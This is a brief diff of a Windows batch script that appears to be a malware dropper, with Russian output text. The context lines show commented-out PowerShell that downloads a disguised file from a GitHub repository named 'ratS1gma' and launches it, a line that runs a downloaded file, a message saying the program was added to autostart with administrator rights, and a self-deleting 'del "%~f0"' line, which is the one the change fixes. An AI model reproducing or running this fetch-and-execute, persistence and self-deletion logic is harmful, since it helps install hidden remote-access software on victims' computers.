@@ -35,6 +35,6 @@ start "" "%outputFilePath%"
 ::powershell Invoke-WebRequest -Uri "https://github.com/ratS1gma/zlob/raw/refs/heads/main/bud.pptx" -OutFile "%USERPROFILE%\Downloads\bud.pptx"
 ::powershell Start-Process -FilePath "%USERPROFILE%\Downloads\bud.pptx"
 
-del %~f0"
+del "%~f0"
 
 echo Программа добавлена в автозагрузку с правами администратора.
